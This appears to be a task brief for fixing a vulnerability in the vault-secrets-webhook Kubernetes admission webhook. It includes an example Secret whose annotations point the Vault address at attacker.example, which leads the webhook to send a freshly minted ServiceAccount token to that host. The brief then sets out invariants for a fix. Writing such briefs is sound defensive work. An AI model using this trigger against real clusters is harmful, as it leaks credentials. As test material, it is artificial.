# vault-secrets-webhook — object-supplied Vault connection settings

## What this is

vault-secrets-webhook is a Kubernetes mutating admission webhook. When an object is created or
updated, the webhook may rewrite it: in some cases it injects helper containers and environment so
the workload can read secrets from Vault itself, and in others it resolves `vault:`-prefixed values
itself and writes the plaintext back. To resolve those values the webhook authenticates to Vault;
when the object names a ServiceAccount it mints a token for that account and attaches it to its
Vault client.

## Observed problem

A user who can create an object in a namespace can make the webhook send its Vault request,
carrying the token it just minted, to a host that user chooses.

Concretely: create a Secret annotated with
`vault.security.banzaicloud.io/vault-addr: https://attacker.example` and
`vault.security.banzaicloud.io/vault-serviceaccount: <a service account in the namespace>`, holding
a value such as `vault:secret/data/x#k`. The webhook opens a connection to `attacker.example` and
presents the minted ServiceAccount token there.

## Security property (invariants)

For every connection the webhook itself opens while processing an object:

- No value supplied by that object may move a Vault connection to an endpoint other than the one
  the operator configured, or weaken certificate verification on any connection.
- Settings the operator configured are trusted and continue to apply.
- When a request would need such an object-supplied value to open a connection, it is refused with
  a client error and no connection is made; it must not silently fall back to a different endpoint
  or verification setting.
- Values that the webhook only copies into the workload it mutates are not covered by this rule and
  keep their present behaviour.

An address the operator configured is trusted even when it is a private or loopback address.
Everything that works today keeps working.

## Keep working

- A legitimate address or verification setting that the operator configured is still used, and a
  mutation that uses it still completes.
- A value the webhook merely copies into a mutated workload is still copied verbatim.
- The operator's own verification settings still take effect when an object does not override them.

The examples above are examples, not the full set of cases.

## Constraints

- Fix the underlying problem and its close variants, not just the example trigger.
- Keep every legitimate use working.
- Do not special-case the example values.
- Do not look up the upstream fix for this issue.
